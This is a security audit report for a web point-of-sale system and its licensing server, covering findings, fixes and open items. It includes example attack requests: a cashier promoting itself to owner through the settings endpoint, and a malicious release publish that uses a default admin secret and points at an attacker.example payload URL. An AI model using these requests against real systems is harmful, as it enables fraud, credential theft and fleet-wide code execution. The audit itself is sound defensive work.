# Web POS — Security Audit & Open Loopholes

**Date:** 2026-08-21
**Scope:** Full-stack review of `backend/`, `frontend/`, `licensing_server/`, `deploy/`
**Method:** Manual adversarial code review of every auth, money, settings, payment and update path — "try to break it" walkthrough.

**Remediation pass: 2026-08-24.** C1–C5, H1–H8 fixed (H1 partially — see its
entry), verified by `npm test` (611/611) and `npm run test:e2e` (43/43), plus
manual boot/curl checks on `licensing_server`. M1–M5 and L1–L3 were not
addressed in this pass — see the status table for what's still open. Details
in each finding's section below; original findings text is otherwise
unchanged so this stays a readable diff of what was found vs. what closed it.

**Follow-up pass: 2026-08-30.** L1 and L3 closed (see their sections below).
L2 remains open — it is deployment-time infrastructure proof, not a code
change, and there is still no VPS/domain to prove it against (CLAUDE.md §7).
M1, M3–M5 still not addressed — unchanged from the 2026-08-24 pass.

**Follow-up pass: 2026-08-31.** L2's code/config half made locally provable
(`deploy/verify-nginx-proxy.sh`, see L2's section below) — finding stays
OPEN, the DNS/TLS/firewall half is still genuinely infra-blocked.

---

## Executive Summary

The system has a **strong foundation**: server-side pricing (never trusts client totals/rates), scrypt-hashed PINs and passwords, TOTP MFA with recovery codes, double-submit CSRF, HMAC-signed Razorpay webhooks, settings encrypted at rest (secret vault), SQLite ACID transactions, an append-only hash-chained audit trail, a fail-closed production guard, and a signature-verified release pipeline.

**Yet several loopholes remain open, and one is architectural and dominant:**

> **`POST /api/settings` is gated only by `requireAdminSession`. Any logged-in cashier can rewrite the entire settings document — including promoting themselves to `owner`, zeroing the GST slab, or swapping the Razorpay secret.**

That single hole chains into full financial/system takeover; it is the #1 thing to fix. Everything below is enumerated outward from it.

**Open-at-a-glance:**

| # | Severity | Issue | Status |
|---|----------|-------|--------|
| C1 | CRITICAL | Cashier → Owner via `POST /api/settings` (no role check) | **FIXED 2026-08-24** — `requireRole('owner')` gate + `mergeOperators` owner-role guard |
| C2 | CRITICAL | Licensing server ships default admin secret → fleet-wide RCE via auto-update | **FIXED 2026-08-24** — fails closed under `NODE_ENV=production`/`ENV_NAME=production`; admin publishes now audit-logged |
| C3 | HIGH | No RBAC on most admin routes (customer-accounts, diagnostics, updates) | **FIXED 2026-08-24** — `requireRole` added to settings, customer-accounts, diagnostics, update, backup/reports/gold-price-sync routes |
| C4 | HIGH | Stored XSS in admin `alert()` override (`innerHTML`) | **FIXED 2026-08-24** — rewritten to DOM nodes + `textContent`, matching `customer.html`'s existing pattern |
| C5 | MEDIUM | CSP allows `'unsafe-inline'` scriptSrc | **FIXED 2026-08-24** — every inline `<script>`/`onclick=` moved to `frontend/js/`; `scriptSrc` no longer carries `'unsafe-inline'` |
| H1 | HIGH | Distributed brute-force of 4-digit PIN (per-IP lockout only) | **PARTIALLY FIXED 2026-08-24** — added a tenant-wide failed-login breaker (100 failures/15 min → 5 min global lockout) independent of source IP; minimum PIN length raised 4→6 digits for new/changed PINs. True per-operator attempt counting is not implemented — a wrong PIN cannot be attributed to a specific operator with no username field to key on (see H1 note below) |
| H2 | HIGH | No rate limit on `/api/payment/verify` (gateway quota abuse / DoS) | **FIXED 2026-08-24** — `paymentVerifyLimiter`, keyed per customer, 60/hour |
| H3 | HIGH | Public, unthrottled, unbounded `/api/qrcode` (CPU DoS) | **FIXED 2026-08-24** — rate-limited (60/min) and `data` capped at 200 characters |
| H4 | MEDIUM | Customer-account enumeration via registration error codes | **FIXED 2026-08-24** — `ACCOUNT_EXISTS`/`CLAIM_REQUIRES_STORE` merged into one `REGISTRATION_BLOCKED` response |
| H5 | MEDIUM | `err.message` leaked to clients on several routes | **FIXED 2026-08-24** — the 5 confirmed sites (`/api/payment/order`, `/api/sales`, `/api/license/activate`, `/api/gold-price/sync`, plus `/api/payment/verify`) now return a generic message + `requestId`; `/api/diagnostics/telemetry`'s raw log tail is mitigated by C3's new owner-only gate rather than redacted |
| H6 | MEDIUM | Licensing `/api/license/verify` — no rate limit, key enumeration | **FIXED 2026-08-24** — rate-limited 30/hour per IP; response-shape enumeration itself not redesigned (would need a UX call — see fix notes) |
| H7 | MEDIUM | Licensing `failedAdminAttempts` is an unbounded Map (memory DoS) | **FIXED 2026-08-24** — swapped for a bounded, TTL-swept map |
| H8 | MEDIUM | Licensing server — permissive CORS, no CSP/helmet, no rate limiter | **FIXED 2026-08-24** — `cors()` removed outright (dependency dropped), basic security headers added, blanket + per-route rate limiting added |
| M1 | MEDIUM | No approval/alert for extreme invoice discounts | **OPEN** — not addressed this pass |
| M2+ | MEDIUM/LOW | No rate limiters on many admin/customer endpoints (table below) | **PARTIALLY ADDRESSED** — the endpoints named in C3/H2/H3/H6 above are covered; the remaining rows in the matrix are still open |
| L1 | INFO | Dev private keys auto-generated into repo workspace | **FIXED 2026-08-30** — `cryptoHelper.js`/`blackBoxLogger.js` refuse to mint a new keypair when `NODE_ENV=production` and the shipped public key is missing |
| L2 | INFO | Licensing server binds 127.0.0.1 only; nginx exposure unproven | **OPEN** — genuinely blocked on infrastructure, not code (no VPS/domain provisioned, CLAUDE.md §7); proof step is `docs/GO_LIVE_CHECKLIST.md` A7 |
| L3 | INFO | trust-proxy scope | **FIXED 2026-08-30** — warning comment added at the `app.set('trust proxy', ...)` call site so a future widening can't happen without reading the H1 caveat |

---
## CRITICAL findings

### C1 — Privilege escalation through `POST /api/settings` (cashier → owner)

**File:** `backend/server.js` — route at line 1409; gate is `requireAdminSession` only (**no** `requireApprover`, no owner check). `mergeOperators()` (~line 1265) accepts `role` straight from the payload and validates only that it is one of `['owner','manager','cashier','auditor']`. It never asks **who** is making the request.

**Working exploit — any logged-in cashier, one request:**

```http
POST /api/settings HTTP/1.1
Cookie: gp_admin_sess=<cashier session>
X-CSRF-Token: <csrf>
Content-Type: application/json

{
  "operators": [
    { "id": "boss",   "name": "Existing Owner", "role": "owner", "pin": "" },
    { "id": "hacker", "name": "Hacker",         "role": "owner", "pin": "4321" }
  ]
}
```

An empty `pin` on an existing operator keeps their stored hash, so a crafted payload does not even need the owner's PIN — the cashier just *adds themselves* as an owner and signs in. `revokeSessionsForRosterChange` runs afterwards but spares the caller's own token (`exceptToken`), so the current session survives too.

**What owner access then yields, each in one further request:**

1. `goldTaxSlab: 0` → every future invoice silently bills **0% GST**.
2. `overrideGoldPrice: { price24K: 1, ... }` → server *re-prices every sale off this* → gold sold at ₹1/g.
3. `refundApprovalThreshold: 0` → removes the approver gate on cash refunds.
4. `requireMfaForApprovers: false` → disables privileged MFA.
5. `razorpayKeyId/KeySecret` replaced → future online payments land in the attacker's Razorpay account.
6. `smtp.pass` + `reportEmail`/`alertEmail` redirected → steal SMTP credentials and hide all reports/alerts.
7. `invoiceSeqStart` + `confirmDestructive: true` → corrupt the legally-relevant invoice series.

**Fixes (do both):**

1. Gate `POST /api/settings` behind an owner-only check (`req.actor.role === 'owner'`; the shared master PIN resolves to `OWNER_ACTOR`, so it still passes).
2. `mergeOperators()` must refuse any incoming `owner`-role row (create or edit) unless the caller is an owner — defence-in-depth against a future route mistake.

### C2 — Licensing server: default admin secret = fleet-wide RCE via auto-update

**File:** `licensing_server/server.js` line 25:

```js
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'MASTER-ADMIN-SECRET-12345';
```

That default is **documented in the repo and printed to stderr on boot**. Anyone who can reach port 6060 can:

```http
POST /api/admin/releases HTTP/1.1
Authorization: Bearer MASTER-ADMIN-SECRET-12345
Content-Type: application/json

{ "version": "9.9.9", "channel": "security",
  "downloadUrl": "https://attacker.example/payload.zip",
  "sha256": "<sha256 of payload.zip>" }
```

`backend/updateEngine.js` polls the `security` channel daily and **auto-applies** matching releases on every tenant. The licensing server *signs whatever the admin publishes*, and the release-verification public key ships inside every tenant — so the publisher is trusted by construction. A default or leaked admin secret = **remote code execution on the entire tenant fleet**, and the licensing server keeps no audit log of admin actions.

The existing boot warning does **not** refuse to boot.

**Fixes:**
- Refuse to boot under `NODE_ENV=production` without a strong, tenant-specific `ADMIN_SECRET` (mirror `productionGuard.js`'s fail-closed posture).
- Bounded per-IP lockout map for admin auth (reuse `createBoundedMap` from `backend/rateLimit.js`).
- Audit-log every admin publish (who / what / when / source IP).

---
## HIGH findings

### C3 — No role-based access control on most admin routes

All of the following are gated only by `requireAdminSession`, so **any cashier** can use them:

| Route | What a cashier can do |
|---|---|
| `POST /api/customer-accounts/issue-login` | Reset **any** customer's portal password → take over their account and spend their advance balance |
| `GET /api/customer-accounts` | Enumerate the entire customer base (phone numbers) |
| `GET /api/diagnostics/telemetry` | Read every operator name, IP and internal log line |
| `GET /api/diagnostics/export` | Pull a developer-key-encrypted sample of the whole ledger; the decryption private key sits in `backend/developer_doomsday_keys/` on the same machine |
| `POST /api/admin/update/check` / `apply` | Trigger update checks; apply pending feature/patch releases (a code change) |
| `POST /api/backup/run`, `/api/reports/send-now`, `/api/gold-price/sync` | Abuse costly admin ops (only `expensiveAdminLimiter` 12/hr) |

`GET /api/audit` and the return/advance-approve gates are the exceptions that *do* require `requireApprover` — which makes the settings hole (C1) stand out even more.

**Fix:** add `requireRole('owner')` / `requireRole('manager')` middleware and apply it to settings, customer-account management, diagnostics, and update/backup/report routes.

### C4 — Stored XSS in the admin frontend `alert()` override

**File:** `frontend/index.html` lines 21–27:

```js
window.alert = function(message) {
    ...
    overlay.innerHTML = ` ... <p ...>${message}</p> ... `;
};
```

The **customer** portal (`frontend/customer.html`) deliberately builds its override with `textContent` ("Built with DOM nodes, not innerHTML … textContent makes that structurally un-injectable") — but the **admin** portal interpolates `message` into `innerHTML`. Any server-supplied string that reaches `alert()` — operator names echoed from settings, refund/sale error text built from user input, a customer name returned by a lookup — becomes stored XSS in the admin session. Combined with C5 (unsafe-inline), it executes.

**Fix:** replace `innerHTML` with DOM APIs + `textContent` in `index.html`, identical to `customer.html`.

### C5 — CSP still allows `'unsafe-inline'` scripts

`backend/server.js` line 315: `scriptSrc: ["'self'", "'unsafe-inline'", 'https://checkout.razorpay.com']`. Between C4 and this there is no real barrier to script execution. The legacy inline handlers should be moved to a bundled file so `'unsafe-inline'` can be removed.

### H1 — Distributed brute-force of the admin PIN (per-IP lockout only)

`backend/adminAuth.js`: per-IP escalating lockout (5 fails → 30s, doubling, cap 15 min). A 4-digit PIN is a 10,000-value keyspace. A modest botnet or any IP-rotation capability exhausts it in minutes. There is **no per-PIN/per-operator attempt cap**.

**Fixes:** enforce a minimum PIN length of 6 (UI already allows 8); add per-operator attempt counting; consider a global failed-PIN breaker.

**Fix applied 2026-08-24 (partial):** minimum PIN length raised to 6 digits
for any PIN being SET through `POST /api/settings` (`OPERATOR_PIN_PATTERN` in
`backend/server.js`) — a PIN already on disk from before this change still
verifies at login, so no existing operator is locked out. A tenant-wide
failed-login breaker was added in `backend/adminAuth.js`
(`getGlobalLoginLockoutRemaining`/`recordGlobalFailedLogin`): 100 failed
admin logins within 15 minutes, from any mix of IPs, locks out ALL admin
sign-in attempts for 5 minutes — this is what actually answers "distributed",
since a per-IP counter by definition cannot. **Per-operator attempt
counting was not implemented**: a wrong PIN cannot be attributed to "the
operator it was meant for" because there is no username in this login
flow to key on — the PIN itself is the only input, and it's wrong. The
threshold (100/15min) was chosen generously to avoid a busy multi-till store
tripping its own global lockout; a real attacker is still capped at roughly
100 guesses per 20-minute cycle tenant-wide, on top of the existing per-IP
escalation.

### H2 — No rate limit on `/api/payment/verify`

The browser verify path (line 3234) is unthrottled and each call makes an upstream Razorpay HTTPS lookup. A signed-in customer can loop it to burn gateway quota and CPU. The idempotency key prevents double-crediting, not abuse.

**Fix:** add a per-customer limiter (mirror `paymentOrderLimiter`).

### H3 — Public, unthrottled, unbounded `/api/qrcode`

`GET /api/qrcode?data=<arbitrary>` is unauthenticated, unthrottled, and `data` is uncapped. `QRCode.toDataURL` on a large payload is a CPU/memory DoS.

**Fix:** rate-limit + cap `data` at ~200 chars (UPI deep links are short).

### H4 — Account enumeration via distinct registration errors

`POST /api/customer/register` answers `ACCOUNT_EXISTS` vs `CLAIM_REQUIRES_STORE` vs success, letting anyone probe which phone numbers are customers. Login is deliberately silent; registration is not.

**Fix:** return the same 409 wording for both negative cases.

### H5 — `err.message` echoed to clients

Confirmed leak sites in `server.js`:

- `/api/payment/order` → `'Failed to create payment order: ' + err.message`
- `/api/sales` → `'Failed to process sale transaction: ' + err.message`
- `/api/license/activate` → `'License activation failed: ' + err.message`
- `/api/gold-price/sync` → `'Sync failed: ' + err.message`
- `/api/diagnostics/telemetry` → raw `error.log` tail

**Fix:** log the full error server-side; return a generic message + requestId.

### H6 — Licensing `/api/license/verify` unthrottled + key enumeration

No rate limit, and the response distinguishes `invalid` from `active`/`expired`/`suspended` — a network attacker can enumerate valid license keys and spam the control plane.

### H7 — Licensing server `failedAdminAttempts` is an unbounded Map

`licensing_server/server.js` line 302 — plain `new Map()`, entries only removed on *successful* auth. One request per new IP grows it forever (memory DoS). The POS backend already has the right tool: `createBoundedMap`.

### H8 — Licensing server: permissive CORS, no helmet/CSP, no rate limiter

`app.use(cors())` allows any origin; no security headers; no global rate limiting. The admin panel lives on the same origin so CORS is less critical, but the whole surface is needlessly exposed.

---
## MEDIUM findings

### M1 — No guard or alert on extreme invoice discounts

`backend/services/saleService.js` line 249: any cashier can apply a 100% discount. The `refundApprovalThreshold` guards *refunds* but nothing guards a dirt-cheap *sale*. Consider a configurable threshold + `raiseAlert` when a line/invoice discount crosses it.

### M2 — No rate limiters on many endpoints (matrix)

| Endpoint | Auth | Rate limited? | Notes |
|---|---|---|---|
| `POST /api/admin/login` | public | ✅ `loginRateLimiter` | per-IP escalating; see H1 for distributed brute-force |
| `POST /api/customer/login` | public | ✅ `customerLoginRateLimiter` | per-IP + per-account |
| `POST /api/customer/register` | public | ✅ `registerLimiter` 10/hr | reveal-errors flaw H4 |
| `POST /api/customer/password/forgot` | public | ✅ `passwordResetLimiter` | |
| `POST /api/customer/password/reset` | public | via `customerLoginRateLimiter` + max 5 attempts | good |
| `POST /api/payment/order` | customer | ✅ `paymentOrderLimiter` 30/hr | |
| `POST /api/payment/verify` | customer | ❌ **none** | H2 |
| `POST /api/customer/advances` | customer | ✅ `depositClaimLimiter` 20/hr | |
| `PATCH/POST /api/customer/me`, `/password/change`, `/logout` | customer | ❌ none | low risk |
| `GET /api/customer/*` | customer | ❌ none | read-only, low |
| `POST /api/settings` | admin | ❌ none **and no role check** | C1 |
| `POST /api/admin/mfa/*` | admin | ❌ none | |
| `GET/POST /api/admin/sessions*` | approver | ❌ none | |
| `GET /api/customer-accounts` / `issue-login` | admin | ❌ none + no role check | H3 |
| `GET /api/diagnostics/*` | admin | exports: `expensiveAdminLimiter`; telemetry ❌ none | H3 |
| `POST /api/admin/update/*` | admin | ❌ none | H3 |
| `POST /api/backup/run`, `/reports/send-now`, `/gold-price/sync` | admin | ✅ `expensiveAdminLimiter` 12/hr | still cashier-reachable |
| `GET /api/qrcode` | **public** | ❌ **none** | H3 public DoS |
| `GET /api/gold-price`, `/settings/public`, `/license/status`, `/health`, `/ready` | public | ❌ none (probes by design) | acceptable |
| `POST /api/sales`, `/returns`, `/advances`, inventory, cash-shifts, drafts | admin | ❌ none | per-operator limiters recommended |
| `POST /api/license/activate` | public | ❌ none | control-plane spam |
| Static assets | public | ❌ none | low |

(Note: this matrix merges the C3 route list — customer-accounts/diagnostics/updates need role checks *and* limiters.)

### M3 — Operator PIN hashes share one tenant salt (documented trade-off)

Equal PINs → equal hashes is safe *only because* duplicates are refused outright. Keep that invariant — do not relax the duplicate-PIN check. This reinforces H1: with a small keyspace, the salt does not stop offline grinding of a leaked file.

### M4 — Licensing admin endpoints only token-gated, no audit log

`/api/admin/keys`, `/api/admin/releases`, `/api/releases` are gated by the bearer token alone — no per-IP limiter, no audit record of who published a release. See C2/H7/H8.

### M5 — Timing nuance in customer login (accepted)

`loginCustomer` returns after `findAccount` before scrypt when the phone is unknown, so account-existence probing has a very slight timing signal. Bounded by limiters; acceptable, noted for completeness.

---

## LOW / informational

### L1 — Dev private keys auto-generated into the repo workspace

`backend/cryptoHelper.js` writes `developer_doomsday_keys/developer_private.pem` (RSA-4096; decrypts every Level-2 support export) and `backend/blackBoxLogger.js` writes `developer_blackbox_keys/blackbox_private.pem` whenever the matching public key is missing on disk. On a real tenant machine those sit beside the data they protect. They are gitignored — but remove them from production builds and never ship them.

**FIXED 2026-08-30.** `release_pipeline.js` already shipped both `backend/keys/developer_public.pem` and `backend/keys/blackbox_public.pem` in the dist bundle (the general recursive copy of `backend/` — only the *private* key path was ever excluded), so a normal release-built install never hit the auto-generation branch. The residual risk was a misconfigured or hand-copied deploy that shipped `backend/` without those public keys: `ensureKeysExist()`/`ensureBlackBoxKeysExist()` would then silently mint a fresh RSA-4096 keypair on the tenant's own machine and write the private half to disk beside the ledger it protects. Both functions now check `NODE_ENV === 'production'` before generating and refuse (log via `logError`/`dbLogError`, return without writing a key) rather than improvise — Level-2 export and black-box export degrade to an error until the shipped key is restored, instead of quietly creating new cryptographic material on a live till. No test previously covered this path (none broken).

### L2 — Licensing server binds 127.0.0.1 only

`app.listen(PORT, '127.0.0.1')` in `licensing_server/server.js` — the control-plane is loopback-only; `deploy/nginx.conf.template` is the intended public path but has **not been proven end-to-end** (per CLAUDE.md §7 no VPS/domain provisioned as of 2026-07-17). Verify firewall/proxy config before exposing; otherwise C2's default-secret risk becomes internet-facing.

**2026-08-31: the code/config half is now provable without a VPS, the infra half still isn't.** `deploy/verify-nginx-proxy.sh` boots `licensing_server/` on an ephemeral port, renders the real `deploy/nginx.conf.template` into an `nginx:alpine` container, and curls through it — proving `proxy_pass`/header forwarding to the loopback-bound app actually works, unmodified from what `deploy/provision-pipeline.sh` renders in production. Run and passed locally (`{"status":"ok",...}` through the proxy, `nginx -t` clean). Still open and still genuinely blocked on infrastructure: DNS resolving a real subdomain to the VPS, `certbot` issuing a real cert, and `ufw` + the public internet actually reaching the box — none of that can be simulated without a live VPS/domain (CLAUDE.md §7). Finding stays OPEN; proof step is still `docs/GO_LIVE_CHECKLIST.md` A7.

**Still open 2026-08-30 — genuinely infrastructure-gated, not a code fix.** The bind address itself (`127.0.0.1`, hardcoded, not configurable) already makes the raw port unreachable from outside the host regardless of firewall state, so the only thing actually unproven is that Nginx+TLS terminates and proxies correctly end-to-end. That proof already has a home: `docs/GO_LIVE_CHECKLIST.md` **A7 — "Prove it works end to end"** hits `https://license.<domain>/api/health` through the real reverse proxy once a VPS and domain exist. There is nothing to build here until Track A of that checklist is run; do not fabricate a substitute check against infrastructure that doesn't exist yet.

### L3 — trust-proxy scope

`app.set('trust proxy', 'loopback')` is correct for same-host nginx. Do not widen it to remote LBs/CDNs without hardening H1 first (real client IPs also mean per-IP lockouts are per-attacker).

**FIXED 2026-08-30.** The setting itself was already correct and needed no change. Added a comment at the `app.set('trust proxy', 'loopback')` call site in `backend/server.js` spelling out exactly why widening it is unsafe before H1's per-operator lockout lands (a wider trust-proxy scope makes `X-Forwarded-For` attacker-suppliable), so the next person touching that line reads the constraint instead of rediscovering it.

---
## Already closed — verified during this review (keep the tests that pin them)

- **Client totals/rates are never trusted.** `saleService.priceLine()` re-prices every line against server rates; mismatched client totals are logged and overridden (`totalCorrected`/`rateCorrected`).
- **Razorpay `verify` ignores `req.body.amount`** — reads the stored order's amount, compares the gateway capture in integer paise, checks payment↔order binding, and confirms capture with the gateway before crediting.
- **Webhook**: HMAC over the raw request bytes, `timingSafeEqual`, fail-closed without a configured secret, and payment-event ids deduplicated by a unique index (replays answered, never double-credited).
- **Secrets at rest** are `encv1$`-sealed; `settingsStore.js` is the only door; `test_suite.js` asserts no raw `readJSON`/`writeJSON` on settings.json elsewhere.
- **PINs/passwords** scrypt-hashed (self-describing work factors), plaintext migrated out, duplicate PINs keyed on hash and refused, production guard blocks default `1234`.
- **CSRF**: double-submit tokens on every mutating admin and customer route (exempting safe methods).
- **Static serving** cannot escape `../frontend`; no path traversal.
- **Client-safe error handler** masks stack traces behind `INTERNAL_ERROR` + `requestId` (in the non-production branch; see H5 for the routes that still leak).
- **Customer portal is session-scoped** — phone never read from body/query for customer data.
- **License gate** still lets webhooks, license admin, and health through when lapsed — correct, and not an open hole.

---

## Recommended fix order

| Priority | Action | Closes | Status |
|---|---|---|---|
| 1 | Owner-only gate on `POST /api/settings` + owner-role check in `mergeOperators` | C1 | **Done 2026-08-24** |
| 2 | Force non-default, strong `ADMIN_SECRET` in production licensing server; audit-log admin publishes | C2 | **Done 2026-08-24** |
| 3 | `requireRole`/`requireApprover` middleware on settings, customer-accounts, diagnostics, updates | C3 | **Done 2026-08-24** |
| 4 | Admin `alert()` → `textContent`; remove `'unsafe-inline'` once inline handlers are moved | C4,C5 | **Done 2026-08-24** |
| 5 | Minimum PIN 6 chars + per-operator (per-PIN) lockout | H1 | **Partial 2026-08-24** — PIN length + a global (not per-operator) breaker; see H1 note above for why |
| 6 | Add limiters: `/api/qrcode`, `/api/payment/verify`, `/api/license/activate`, unthrottled admin writes | H2,H3,H4,H6 | **Done 2026-08-24** — H4 fixed by unifying the response instead (limiters don't address enumeration); `/api/license/verify` also limited (H6) |
| 7 | Generic 500 bodies on the leaky routes | H5 | **Done 2026-08-24** — the 5 confirmed sites; `/api/diagnostics/telemetry`'s log tail is now owner-gated (C3) rather than redacted |
| 8 | Bounded map + rate limiter on licensing `failedAdminAttempts` | H7 | **Done 2026-08-24** |
| 9 | Strip dev private keys from shipped builds; firewall/reachability proof for licensing public path | L1,L2 | **L1 done 2026-08-30** (refuse-to-generate guard); **L2 blocked on infra** — see L2 note above |

**Not addressed this pass:** M1 (extreme-discount alerting — needs a threshold/product decision), M3–M5 (already accepted trade-offs / low severity, no action needed), L2 (deployment-time proof — no VPS/domain to prove it against yet). L1 and L3 closed 2026-08-30 — see their sections above.

---

## Verification notes

- Findings verified against working tree at commit `81a6f2a6` (2026-08-20 state).
- No endpoint was live-probed; this is a static adversarial review. C1, C3, and the route matrix are traceable directly in `backend/server.js`.
- If you want, the next step is to implement fixes in the priority order above, or add automated regression tests that assert "a cashier cannot change settings / cannot issue a customer login / cannot apply an update".

*End of audit.*